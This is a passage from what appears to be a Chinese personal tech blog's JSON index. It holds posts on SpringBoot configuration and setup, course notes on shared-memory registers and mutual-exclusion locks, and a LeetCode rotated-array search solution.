目录下，默认的文件名为spring.log。更加具体的配置可以参考官方文档，不再赘述。","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot 配置文件","slug":"SpringBoot-配置文件","date":"2020-06-12T09:49:12.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-配置文件/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","excerpt":"1. yaml 语法 基本语法： 使用缩进表示层级关系 缩进使用空格 大小写敏感 123server: port: 8080 address: www.example.com","text":"1. yaml 语法 基本语法： 使用缩进表示层级关系 缩进使用空格 大小写敏感 123server: port: 8080 address: www.example.com 支持的数据结构 字面量 字符串无需添加双引号 1address: www.example.com 对象和Map 多行写法 1234people: name: Frank age: 18 gender: male 行内写法 多行写法 1people: &#123;name: Frank, age: 18, gender: male&#125; 数组 多行写法 1234animals: - cat - dog - pig 行内写法 多行写法 1people: &#123;cat, dog, pig&#125; 2. 获取配置文件的值 （@ConfigurationProperties） 首先我们在 com.cyf.demo.bean 包下创建一个新的 Hero 类： 1234567891011121314151617// 省略了 getter, setter和toStringpublic class Hero &#123; // 测试字面量的获取 private String name; private int atk; private int def; private Boolean isAlive; // 测试Map的获取 private Map&lt;String, Integer&gt; abilities; // 测试数组的获取 private List&lt;String&gt; equipments; // 测试对象的获取 private Weapon weapon;&#125; 同样的我们创建 Hero 类包含的 Weapon 类 12345// 省略了 getter, setter和toStringpublic class Weapon &#123; private int atk; private int def;&#125; 此时我们在 src/main/resources 文件夹下创建 application.yml，并添加以下内容, 可以发现与我们定义的 Hero 类的属性完全一致： 1234567891011Hero: name: Ashe atk: 20 def: 20 isAlive: ture abilities: bomb: 20 shotgun: 10 weapon: atk: 20 def: 0 然后我们为 Hero 类添加 @ConfigurationProperties 注解。它可以讲配置文件中的属性值和类中对应的属性值联系起来。 12345@Component // 启用配置文件功能，类本身必须是一个Component@ConfigurationProperties(prefix = &quot;Hero&quot;)public class Hero &#123; ...&#125; 此时我们得到了一条提示： 这是因为我们并没有在 Maven 中添加 SpringBoot 的注解处理器，根据官方文档，我们在 pom.xml 中添加： 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt; 然后重新运行一遍我们的 DemoApplication, Annotation Processor 就会正常工作了, 编写配置文件的时候Idea也会进行提示。 接下来我们修改 src/test/java/com/cyf/demo/DemoApplicationTests.java, 编写一个单元测试来测试我们配置文件的值是否注入。 12345678910@SpringBootTestclass DemoApplicationTests &#123; // 自动注入Hero类 @Autowired Hero hero; @Test void contextLoads() &#123; System.out.println(hero); &#125;&#125; 运行测试，我们发现输出为： 1Hero&#123;name=&#x27;Ashe&#x27;, atk=20, def=20, isAlive=null, abilities=&#123;bomb=20, shotgun=10&#125;, equipments=null, weapon=Weapon&#123;atk=20, def=0&#125;&#125; 也就是说Spring成功的获取了我们配置文件中的值并注入到了对应的类中。 3. 获取配置文件的值 （@Value） 使用 @Value 注解和在之前的 Spring 中配置文件的 &lt;bean&gt; 便签中进行配置基本相同，原来我们会这样配置一个bean： 123&lt;bean class=&quot;Hero&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;()&quot;&gt;&lt;bean/&gt; 在value处Spring支持三种类型： 字面量 $&#123;key&#125; 从配置文件中获取key对应的value #&#123;SpEL&#125; 运算 因此 @Value 注解同样支持这三种类型。作为测试，我们修改Hero类如下： 123456789101112131415// 省略了 getter, setter和toString@Component//@ConfigurationProperties(prefix = &quot;hero&quot;) 不再使用 ConfigurationPropertiespublic class Hero &#123; @Value(&quot;$&#123;hero.name&#125;&quot;) // 通过key获取value private String name; @Value(&quot;#&#123;10*2&#125;&quot;) // 计算 private int atk; @Value(&quot;20&quot;) // 字面量 private int def; private Boolean isAlive; private Map&lt;String, Integer&gt; abilities; private List&lt;String&gt; equipments; private Weapon weapon;&#125; 重新运行单元测试，输出为： 1Hero&#123;name=&#x27;Ashe&#x27;, atk=20, def=20, isAlive=null, abilities=null, equipments=null, weapon=null&#125; 可以发现我们注解了的三个值都成功的注入到了对象中。 4. @Value 和 @ConfigurationProperties 的区别 @Value @ConfigurationProperties 功能 批量注入配置文件属性 单个属性注入 松散绑定* 支持 不支持 SpEL 不支持 支持 复杂类型 支持 不支持 *松散绑定指的是 lastName = last-name 5. @PropertySource 和 @ImportResource 如果所有配置都写在 application.properties 里，会显得配置文件过于复杂或者庞大。此时我们可以使用 @PropertySource 来指定要读取的配置文件。刚才我们把所有的 Person 类的属性写在了 application.yml 里。现在我们可以把内容改成 properties 的格式，然后放入 person.properties 文件中： 12345678hero.name=Ashehero.atk=20hero.def=20hero.isAlive=turehero.abilities.bomb=20hero.abilities.shotgun=10hero.weapon.atk=20hero.weapon.def=0 然后再 Hero 类前方添加如下注解： 123456@PropertySource(&quot;classpath:person.properties&quot;) // 使用 person.properties 作为本类的配置文件@Component@ConfigurationProperties(prefix = &quot;Hero&quot;)public class Hero &#123; ...&#125; 配置一样可以成功注入类中。 而 @ImportResource 则是用来加载自定义配置文件用的，如果我们在 resource 目录下添加一个 beans.xml 文件，SpringBoot 不会自动导入这个配置文件，我们需要在 DemoApplications 中加入注解： 1@ImportResource(locations=&#123;&quot;classpath:bean.xml&quot;&#125;) SpringBoot 才会识别这个配置文件。但是SpringBoot并不推荐我们这样添加新的组件，推荐使用全注解的方式来添加组件。 首先在我们的 com.cyf.demo 包下创建一个新的 service 包。然后编写一个 HelloService 类。 12345678package com.cyf.demo.service;public class HelloService &#123; public void sayHello()&#123; System.out.println(&quot;This is a hello from hello service&quot;); &#125;&#125; 当我们尝试在单元测试中注入 HelloService 时， 会发选 Idea 已经提示我们无法找到这个bean： 通常我们会编写一个配置文件来导入这个包，但是现在我们通过配置类的方式。在我们的 com.cyf.demo 包下创建一个新的 config 包，新建 HelloConfig 类： 12345678@Configuration // 表明这是一个配置类public class HelloConfig &#123; @Bean // 等同于原本的&lt;bean&gt; 标签，方法名就是原本的bean id public HelloService helloService()&#123; return new HelloService(); &#125;&#125; 此时我们再运行单元测试： 1This is a hello from hello service 这个组件就通过我们的配置类加载进来了。 6. 配置文件占位符 共有两种，一种是随机数占位符，还有一种时属性配置占位符。我们分别举例。 之前我们的 application.yml 中指定了 Hero 类型的一些属性，现在我们可以向其中添加一些占位符： 1234567891011hero: name: Ashe$&#123;random.uuid&#125; # 生成随机UUID atk: $&#123;random.int&#125; # 生成随机整数 def: 20 isAlive: ture abilities: bomb: 20 shotgun: 10 weapon: atk: $&#123;hero.atk&#125; # 使用存在的属性配置 def: $&#123;hero.at:10&#125; # 若属性不存在则可以使用冒号指定默认值 此时我们再次运行单元测试： 1Hero&#123;name=&#x27;Ashe8a1189c9-2740-4b6e-b85b-14de42bdfb42&#x27;, atk=-156092609, def=20, isAlive=null, abilities=&#123;bomb=20, shotgun=10&#125;, equipments=null, weapon=Weapon&#123;atk=-499134195, def=0&#125;&#125; 可以观察到生成的UUID，随机整数的ATK，以及和ATK相同的Waepon ATK。由于 hero.at 这个属性不存在，weapon.def 被设置成了默认值10。 7. Profile 在实际开发过程中经常牵涉到不同环境的切换（生产/开发/测试）。共有两种方法可以实现多profile。 当使用properties文件时，我们可以使用 application-&#123;profile name&#125;.properties 来实现多profile配置，例如 application-dev.properties 代表开发环境。 当使用yaml文件时，我们可以使用yaml的文档块来实现多profile，例如： 1234567891011server: port: 8081spring: profiles: dev---server: port: 80spring: profiles: prod 在启动项目时，加上 -spring.profiles.active=&#123;profile name&#125; 即可在profile之间切换。","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot 入门","slug":"SpringBoot-入门","date":"2020-06-12T08:48:38.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-入门/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-%E5%85%A5%E9%97%A8/","excerpt":"Hello World 1. 使用IDEA中的Spring Initializer创建一个新工程 初始项目中选择Spring Web，创建好以后目录结构如下 1234567891011121314151617181920212223.├── HELP.md├── demo.iml├── mvnw├── mvnw.cmd├── pom.xml└── src ├── main │ ├── java │ │ └── com │ │ └── cyf │ │ └── demo │ │ └── DemoApplication.java │ └── resources │ ├── application.properties │ ├── static │ └── templates └── test └── java └── com └── cyf └── demo └── DemoApplicationTests.java","text":"Hello World 1. 使用IDEA中的Spring Initializer创建一个新工程 初始项目中选择Spring Web，创建好以后目录结构如下 1234567891011121314151617181920212223.├── HELP.md├── demo.iml├── mvnw├── mvnw.cmd├── pom.xml└── src ├── main │ ├── java │ │ └── com │ │ └── cyf │ │ └── demo │ │ └── DemoApplication.java │ └── resources │ ├── application.properties │ ├── static │ └── templates └── test └── java └── com └── cyf └── demo └── DemoApplicationTests.java 2. 编写一个新的controller 我们在 com.cyf.demo 下创建一个新的 controller 包。新建 HelloController 类。内容如下： 123456789101112package com.cyf.demo.contrtoller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController //是 @Controller 和 @ResponseBody 的结合public class HelloController &#123; @RequestMapping(&quot;/hello&quot;) // 指定访问 /hello 时调用此函数 public String hello()&#123; return &quot;Hello World!&quot;; &#125;&#125; 3. 运行项目 回到我们的 DemoApplication, 点击旁边的绿色小三角： 可以看到Tomcat自动启动，服务已经跑起来了 此时在浏览器访问 localhost:8080/hello 可以看到返回了我们在新建的Controller中定义的字符串","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"Chapter 4 Foundations of Shared Memory","slug":"Chapter-4-Foundations-of-Shared-Memory","date":"2020-04-29T08:31:02.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/Chapter-4-Foundations-of-Shared-Memory/","link":"","permalink":"https://virgilchen97.github.io/2020/04/Chapter-4-Foundations-of-Shared-Memory/","excerpt":"The space of registers 寄存器空间 定义 一个支持读写的寄存器的定义，如果实现的是 Register&lt;boolean&gt;，那么就叫做 布尔寄存器（Boolean Register）， 如果是 Register&lt;Integer&gt; ，那么就是 多值寄存器（M-valued Register） 12345// Register的接口定义public interface Register&lt;T&gt;&#123; T read(); void write(T val)&#125;","text":"The space of registers 寄存器空间 定义 一个支持读写的寄存器的定义，如果实现的是 Register&lt;boolean&gt;，那么就叫做 布尔寄存器（Boolean Register）， 如果是 Register&lt;Integer&gt; ，那么就是 多值寄存器（M-valued Register） 12345// Register的接口定义public interface Register&lt;T&gt;&#123; T read(); void write(T val)&#125; 寄存器的安全性 Safe / Regular / Atomic Safe 如果 read() 和 write() 不重叠，那么 read() 应当返回最近一次 write() 写入的值。 如果 read() 和 write() 重叠，那么 read() 可以返回寄存器范围内的任意值。 Regular 如果 read() 和 write() 不重叠，那么 read() 应当返回最近一次 write() 写入的值。 如果 read() 和 write() 重叠， 假设 v0−vkv_0 - v_kv0​−vk​ 是曾经被写入这个寄存器的值。那么 read() 应当返回这些值的其中之一。 Atomic 在regular的基础上，先发生的 read() 不能读取到比后发生的 read() 更新的值 单线程寄存器 在单线程环境下可以正常运行的寄存器 123456789public class SequentialRegister&lt;T&gt; implements Register&lt;T&gt; &#123; private T value; public T read()&#123; return value; &#125; public void write(T v)&#123; value = v; &#125;&#125; MRSW Safe Register 基本思路就是为每一个线程创建一个SRSW的寄存器，每一个线程都去自己对应的SRSW寄存器读取，写入则通过循环写入所有的SRSW寄存器 1234567891011121314public class SafeBooleanMRSWRegister implements Register&lt;Boolean&gt; &#123; boolean[] s_table; // array of safe SRSW registers public SafeBooleanMRSWRegister(int capacity) &#123; s_table = new boolean[capacity]; &#125; public Boolean read() &#123; return s_table[ThreadID.get()]; &#125; public void write(Boolean x) &#123; for (int i = 0; i &lt; s_table.length; i++)&#123; s_table[i] = x; &#125; &#125;&#125; MRSW Regular Register 对于Boolean值来说，我们分为两种情况： 新写入的值和旧值不同，这种情况下safe和regular的行为相同，都可以返回0或者1 新写入的值和旧值相同，此时regular只能返回旧值，而safe可以返回0或者1 因此我们只需要做的是在写入一个新值时，只有和原来的值不同才进行写入 123456789101112131415161718public class SafeBooleanMRSWRegister implements Register&lt;Boolean&gt; &#123; ThreadLocal&lt;Boolean&gt; last; boolean s_value; // safe MRSW register RegBooleanMRSWRegister(int capacity) &#123; last = new ThreadLocal&lt;Boolean&gt;() &#123; protected Boolean initialValue() &#123; return false; &#125;; &#125;; &#125; public void write(Boolean x) &#123; if(x != last.get())&#123; last.set(x); s_value = x; &#125; &#125; public Boolean read()&#123; return s_value; &#125;&#125; M-valued MRSW Regular Register 使用unary annotation来表示多值 12345678910111213141516171819202122232425public class RegMRSWRegister implements Register&lt;Byte&gt; &#123; private static int RANGE = Byte.MAX_VALUE - Byte.MIN_VALUE + 1; boolean[] r_bit = new boolean[RANGE]; // regular boolean MRSW public RegMRSWRegister(int capacity) &#123; for (int i = 1; i &lt; r_bit.length; i++)&#123; r_bit[i] = false; &#125; r_bit[0] = true; &#125; public void write(Byte x) &#123; // 设置第x位,然后将左边的覆盖为0 r_bit[x] = true; for (int i = x - 1; i &gt;= 0; i--)&#123; r_bit[i] = false; &#125; &#125; public Byte read() &#123; // 从左数直到第一个1 for (int i = 0; i &lt; RANGE; i++)&#123; if (r_bit[i]) &#123; return i; &#125; &#125; &#125;&#125; SRSW Atomic Register 我们给通过给每次写入添加timestamp来解决，每次 read() 都记录read到值的timestamp，如果有线程read到了值小于timestamp，那么便直到自己读取到了旧值。 123456789101112131415161718192021222324252627public class AtomicSRSWRegister&lt;T&gt; implements Register&lt;T&gt; &#123; ThreadLocal&lt;Long&gt; lastStamp; ThreadLocal&lt;StampedValue&lt;T&gt;&gt; lastRead; StampedValue&lt;T&gt; r_value; // stored in regular SRSW register public AtomicSRSWRegister(T init) &#123; r_value = new StampedValue&lt;T&gt;(init); lastStamp = new ThreadLocal&lt;Long&gt;() &#123; protected Long initialValue() &#123; return 0; &#125;; &#125;; lastRead = new ThreadLocal&lt;StampedValue&lt;T&gt;&gt;()&#123; protected StampedValue&lt;T&gt; initialValue() &#123; return r_value; &#125;; &#125;; &#125; public T read()&#123; // 读取当前值 StampedValue&lt;T&gt; value = r_value; // 读取最后一次读取读取的值 StampedValue&lt;T&gt; last = lastRead.get(); // 比较二者的timestamp，return较新的那一个 StampedValue&lt;T&gt; result = StampedValue.max(value, last); lastRead.set(result); return result.value; &#125; public void write(T val)&#123; long stamp = lastStamp.get()+1 &#125;&#125; MRSW Atomic Register 在我们搭建 SRSW Atomic Register 的时候，我们是通过一个 lastStamp 和 lastRead 变量，让读取到最新值的Reader去帮助其他reader获取最新的值。而在MRSW版本中我们延续了这个思想。让先读取到的Reader帮助其他Reader获取最新的值。具体解释在代码中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class AtomicMRSWRegister&lt;T&gt; implements Register&lt;T&gt; &#123; ThreadLocal&lt;Long&gt; lastStamp; // 最新时间戳 private StampedValue&lt;T&gt;[][] a_table; // 每一个值都存在 SRSW atomic 寄存器中 public AtomicMRSWRegister(T init, int readers) &#123; lastStamp = new ThreadLocal&lt;Long&gt;() &#123; protected Long initialValue() &#123; return 0; &#125;; &#125;; // 使用一个 reader * reader 大小的数组 a_table = (StampedValue&lt;T&gt;[][]) new StampedValue[readers][readers]; // 初始化 StampedValue&lt;T&gt; value = new StampedValue&lt;T&gt;(init); for (int i = 0; i &lt; readers; i++) &#123; for (int j = 0; j &lt; readers; j++) &#123; a_table[i][j] = value; &#125; &#125; &#125; public void write(T v) &#123; long stamp = lastStamp.get() + 1; // 时间戳++ lastStamp.set(stamp); // 设置最新时间戳 StampedValue&lt;T&gt; value = new StampedValue&lt;T&gt;(stamp, v); for (int i = 0; i &lt; a_table.length; i++) &#123; a_table[i][i] = value; // 将对角线上的寄存器依次写入新值 &#125; &#125; public T read()&#123; int me = ThreadID.get(); StampedValue&lt;T&gt; value = a_table[me][me]; // 首先读取自己对应位置的StampedValue // 纵向寻求其他Reader的帮助，看他们是否有获取到更新的值 for (int i = 0; i &lt; a_table.length; i++) &#123; value = StampedValue.max(value, a_table[i][me]); &#125; // 横向覆盖最新值帮助其他Reader，其他Reader纵向扫描就可以扫描到 for (int i = 0; i &lt; a_table.length; i++) &#123; if (i == me) continue; a_table[me][i] = value; &#125; return value &#125;","categories":[{"name":"课程笔记","slug":"课程笔记","permalink":"https://virgilchen97.github.io/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Multi-core Concurrent Programming","slug":"Multi-core-Concurrent-Programming","permalink":"https://virgilchen97.github.io/tags/Multi-core-Concurrent-Programming/"}]},{"title":"Chapter 3 Concurrent Objects","slug":"Chapter-3-Concurrent-Objects","date":"2020-04-20T07:59:03.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/Chapter-3-Concurrent-Objects/","link":"","permalink":"https://virgilchen97.github.io/2020/04/Chapter-3-Concurrent-Objects/","excerpt":"静态一致性 当一个多线程对象需要呗多个线程同时调用时， 我们很难去定义什么叫做正确的执行。因此我们提出了**静态一致性（Quiescent Consistency）**这个概念。 方法调用是按顺序执行的，每次一个。 被静止状态分割的方法调用应该按照他们被调用的顺序生效 这两条性质决定了在多线程环境中，产生的结果可以通过多个线性的方法调用产生。也就是多线程环境下不能产生单线程环境中无法产生的结果。 具体到行为来说。当给我们一个历史 HHH 时，如果对被静止状态分割的各个调用的顺序进行重排能够产生合理的结果，那么这个行为就是满足静态一致性的。","text":"静态一致性 当一个多线程对象需要呗多个线程同时调用时， 我们很难去定义什么叫做正确的执行。因此我们提出了**静态一致性（Quiescent Consistency）**这个概念。 方法调用是按顺序执行的，每次一个。 被静止状态分割的方法调用应该按照他们被调用的顺序生效 这两条性质决定了在多线程环境中，产生的结果可以通过多个线性的方法调用产生。也就是多线程环境下不能产生单线程环境中无法产生的结果。 具体到行为来说。当给我们一个历史 HHH 时，如果对被静止状态分割的各个调用的顺序进行重排能够产生合理的结果，那么这个行为就是满足静态一致性的。 顺序一致性 我们把一个单线程程序产生方法调用的顺序称为程序顺序（Program Order），那么，我们定义**顺序一致性（Sequential Consistency）**为： 方法调用是按顺序执行的，每次一个。 方法调用应当按照程序顺序生效 这一性质决定了在多线程环境下，我们有办法把多线程产生的方法调用排序到一个单线程上，使他们的执行顺序与线程本身的顺序一致. 具体到行为来说。当给我们一个历史 HHH 时，再不调整各个线程自身调用顺序的前提下对所有线程的调用进行重排，如果能产生合力的结果，那么我们称之为满足顺序一致性。 线性一致性（Linearizability） 每个方法调用应该在其调用和响应之间的某个时间点立即生效。 具体行为来说，当给我们一个历史 HHH 时，当我们只调整相互有重叠的调用之间的顺序，如果能产生合理的结果，那么我们称之为满足线性一致性。线性一致性也被我们称之为线程安全。 正式定义 相关概念 我们使用history来表示一个并行系统，他是一个有限的包含了方法调用和响应的序列。我们称之为 HHH。 一个方法调用可以记作 &lt;x.m(a∗)A&gt;&lt;x.m(a^*) A&gt;&lt;x.m(a∗)A&gt;， xxx 是一个对象， mmm 是一个方法， a∗a*a∗ 是参数， AAA 是一个线程。 一个方法响应记为 &lt;x:t(r∗)A&gt;&lt;x:t(r^*) A&gt;&lt;x:t(r∗)A&gt;， ttt 是 ok 或是一个Exception， r∗r^*r∗ 是返回值。 一个方法调用在 HHH 中的体现是是一组匹配的方法调用和他的响应。 一个方法调用是未完成的，则在 HHH 中只有调用，没有响应。 HHH 的extension指的是为 HHH 中没有相应的调用添加响应 complete(H)complete(H)complete(H) 指的是去掉所有没有响应调用的 HHH H∣AH|AH∣A 代表 HHH 中所有和 AAA 相关的history， H∣xH|xH∣x 代表 HHH 中所有和对象 xxx 有关的 如果两个历史被称为等价的，那么对于其中的每一个线程 AAA， H∣A=H∣A′H|A = H|A^\\primeH∣A=H∣A′ 线性一致性（Linearizability） 一个历史 HHH 是可线性化的，如果 HHH 的extension H′H^\\primeH′ 存在，并且还存在一个顺序的历史 SSS 满足： complete(H′)complete(H^\\prime)complete(H′) 和 SSS 是等价的 如果在 HHH 中调用 m0m_0m0​ 在 m1m_1m1​ 之前，那么在 SSS 中也一样 SSS 被我们成为 HHH 的一个线性化(linearization)","categories":[{"name":"课程笔记","slug":"课程笔记","permalink":"https://virgilchen97.github.io/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Multi-core Concurrent Programming","slug":"Multi-core-Concurrent-Programming","permalink":"https://virgilchen97.github.io/tags/Multi-core-Concurrent-Programming/"}]},{"title":"Chapter 2 Mutual Exclusion","slug":"Chapter-2-Mutual-Exclusion","date":"2020-04-18T14:48:20.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/Chapter-2-Mutual-Exclusion/","link":"","permalink":"https://virgilchen97.github.io/2020/04/Chapter-2-Mutual-Exclusion/","excerpt":"时间表示 我们使用事件来表示程序执行过程中发生的操作， 每一个时间都是立即发生并且不会重合的。 一个线程 AAA 会产生一系列的事件 a0a_0a0​, a1a_1a1​, 因为在程序中有许多的循环，因此我们把 aia_iai​ 这一事件的第 jjj 次发生记作 aija_i^jaij​. 如果事件 aaa 发生在事件 bbb 之前，那我们记作 a→ba\\rightarrow ba→b. 我们把在线程 AAA 上一个区间 (a0,a1)(a_0, a_1)(a0​,a1​) 内的时间表示为 IAI_AIA​, 如果 IA→IBI_A \\rightarrow I_BIA​→IB​, 那么 a1→b0a_1 \\rightarrow b_0a1​→b0​。","text":"时间表示 我们使用事件来表示程序执行过程中发生的操作， 每一个时间都是立即发生并且不会重合的。 一个线程 AAA 会产生一系列的事件 a0a_0a0​, a1a_1a1​, 因为在程序中有许多的循环，因此我们把 aia_iai​ 这一事件的第 jjj 次发生记作 aija_i^jaij​. 如果事件 aaa 发生在事件 bbb 之前，那我们记作 a→ba\\rightarrow ba→b. 我们把在线程 AAA 上一个区间 (a0,a1)(a_0, a_1)(a0​,a1​) 内的时间表示为 IAI_AIA​, 如果 IA→IBI_A \\rightarrow I_BIA​→IB​, 那么 a1→b0a_1 \\rightarrow b_0a1​→b0​。 Critical Sections 我们使用锁来管理不同的线程进出关键区，一个优秀的锁要做到： Mutual Exclusion, 不同线程的Critical Section永远不会重合，即 CSAk→CSBjCS_A^k \\rightarrow CS_B^jCSAk​→CSBj​ 或反过来 Freedom from Deadlock, 如果多个线程尝试获取锁，那么最终有一个能获取到 Freedom from Starvation, 任何获取锁的请求最终都会成功 Peterson Algorithm Peterson 算法解决了两个线程之间的锁问题 12345678910111213141516171819class Peterson implements Lock&#123; // 每一个线程自己的flag private boolean[] flag = new boolean[2]; // victim是谁谁就获取不到锁 private int victim; public void lock()&#123; // 自己的ID int i = ThreadID.get(); // 对方的ID int j = 1 - i; flag[i] = true // 我想要获取锁 victim = i; // 但是您先请 while (flag[j] &amp;&amp; victim == i) &#123;&#125;; // 等待获取锁 &#125; public void unlock()&#123; int i = ThreadID.get(); flag[i] = false; // 我不需要锁了 &#125;&#125; Filter Lock 现在我们需要把Peterson算法扩展，实现能被 nnn 个线程使用的锁。 Filter算法创建了 n−1n-1n−1 个“等待区”（Levels）,一个线程只有从等待区的最顶层层层穿越到最底层，才能够获取锁。在Filter算法中，每一层都遵循如下规定： 在第 qqq 层，至少有1个线程能够穿过 如果多个线程想要穿过 qqq 层，那么至少有一个线程会停留在 qqq 层。 12345678910111213141516171819202122232425class Filter implements Lock&#123; int[] level // 等待区 int[] victim // 在等待区最终被留下来的人 public Filter(int n)&#123; level = new int[n]; // 表示 N 个线程分别对哪个等待区有兴趣 victim = new int[n]; // 因为只需要阻止 n-1 个线程，所以只需要用 1 - n-1 for(int i = 0; i &lt; n; i++)&#123; level[i] = 0; &#125; &#125; public void lock() &#123; int me = ThreadID.get(); for(int i = 1; i &lt; n; i++)&#123; level[me] = i; // 我对这一等待区感兴趣 victim[i] = me; // 其他人先 for(int k = 0; k &lt; n; k++)&#123; while(k!=me &amp;&amp; level[k] &gt;= i &amp;&amp; victim[i] == me)&#123;&#125; &#125; &#125; &#125; public void unlock() &#123; level[ThreadID.get()] = 0; &#125;&#125; 公平性 Starvation-freedom 只能保证每个获取Lock的线程最终能够获取到Lock，但是并不保证先后顺序，所以我们不能保证先请求锁的线程先获取锁。因此我们把锁算法分为两个部分： Doorway，我们把线程A在Doorway区发生的事件称为 DAD_ADA​, 包括了有限个步骤 Waiting， 我们把线程A在Waiting区发生的事件称为 WAW_AWA​，不限制步骤的数量 其中Doorway必须要有限步骤完成是非常重要的，我们称之为 boundedwait-free progress。 因此，我们这样定义公平性： 如果一个锁是FIFO的，那么它满足 If DAj→DBkD_A^j \\rightarrow D_B^kDAj​→DBk​, then CSAj→CSBkCS_A^j \\rightarrow CS_B^kCSAj​→CSBk​ Bakery Algorithm 一个FIFO的锁 1234567891011121314151617181920212223242526272829303132class Bakery implements Lock&#123; boolean[] flag; // 代表线程是否对锁有兴趣 Label[] label; // 代表线程进入waiting的顺序 public Bakery(int n)&#123; flag = new boolean[n]; label = new Label[n]; // Initialize &#125; public void lock()&#123; int i = ThreadID.get(); flag[i] = true; // 我感兴趣 label[i] = label.max()+1; // 给自己一个比已经在等待的所有线程都要大的时间戳（最后来的） while(check(me))&#123;&#125;; &#125; public void unlock()&#123; flag[ThreadID.get()] = false; // 我不感兴趣了 &#125; public boolean check(int me)&#123; boolean res = false; for(int i = 0; i &lt; n; i++)&#123; if(i == me)&#123; continue; &#125;else&#123; // 有线程感兴趣，而且的时间戳比我小，等待 if(flag[i] &amp;&amp; label[i] &lt; label[me])&#123; res = true; &#125; &#125; &#125; return res; &#125;&#125;","categories":[{"name":"课程笔记","slug":"课程笔记","permalink":"https://virgilchen97.github.io/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Multi-core Concurrent Programming","slug":"Multi-core-Concurrent-Programming","permalink":"https://virgilchen97.github.io/tags/Multi-core-Concurrent-Programming/"}]},{"title":"33/81.搜索旋转排序数组I/II","slug":"33-81-搜索旋转排序数组I-II","date":"2020-04-13T16:02:39.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/04/33-81-搜索旋转排序数组I-II/","link":"","permalink":"https://virgilchen97.github.io/2020/04/33-81-%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84I-II/","excerpt":"假设按照升序排序的数组在预先未知的某个点上进行了旋转。 ( 例如，数组 [0,0,1,2,2,5,6] 可能变为 [2,5,6,0,0,1,2] )。 编写一个函数来判断给定的目标值是否存在于数组中。若存在返回 true，否则返回 false。 12345678示例 1:输入: nums = [2,5,6,0,0,1,2], target = 0输出: true示例 2:输入: nums = [2,5,6,0,0,1,2], target = 3输出: false 进阶: 这是 搜索旋转排序数组 的延伸题目，本题中的 nums 可能包含重复元素。 这会影响到程序的时间复杂度吗？会有怎样的影响，为什么？","text":"假设按照升序排序的数组在预先未知的某个点上进行了旋转。 ( 例如，数组 [0,0,1,2,2,5,6] 可能变为 [2,5,6,0,0,1,2] )。 编写一个函数来判断给定的目标值是否存在于数组中。若存在返回 true，否则返回 false。 12345678示例 1:输入: nums = [2,5,6,0,0,1,2], target = 0输出: true示例 2:输入: nums = [2,5,6,0,0,1,2], target = 3输出: false 进阶: 这是 搜索旋转排序数组 的延伸题目，本题中的 nums 可能包含重复元素。 这会影响到程序的时间复杂度吗？会有怎样的影响，为什么？ 解法 对于一个旋转排序的数组，我们可以发现一个规律，我们从数组中任选一个元素 nums[x]，若 nums[x] &gt; nums[0]， 我们就可以知道旋转的中心点在 x 的右侧，也就是目前 nums[0] 到 nums[x] 是有序的。同理，如果 nums[x] &lt; nums[0] ，那我们可以知道旋转的中心点在 x 的左侧，也就是此时 nums[x] 到 nums[-1] 是有序的，基于这种思想，我们对数组进行二分查找。 对于第81题来说，唯一的不同是数组中出现了重复元素，我们可以利用二分查找的过程进行去重，在每一次进行二分查找前，如果发现 nums[l] = nums[l+1] 或者 nums[r] = nums[r-1]，那我们对应的进行 l++/r-- 来跳过重复的元素，去除了重复的元素后剩下的过程就与33题相同啦。 123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public int search(int[] nums, int target) &#123; int l = 0; int r = nums.length - 1; while(l &lt;= r)&#123; // 去重 while(l &lt;= r &amp;&amp; nums[l] == nums[l+1])&#123; l++; &#125; while(l &lt;=r &amp;&amp; nums[r] == nums[r-1])&#123; r--; &#125; int m = l + ((r-l)&gt;&gt;1); if(nums[m] == target)&#123; return m; &#125;else&#123; // 左半边有序 if(nums[m] &gt;= nums[l])&#123; if(target &gt;= nums[l] &amp;&amp; target &lt; nums[m])&#123; r = m - 1; &#125;else&#123; l = m + 1; &#125; &#125;else&#123; //右半边有序 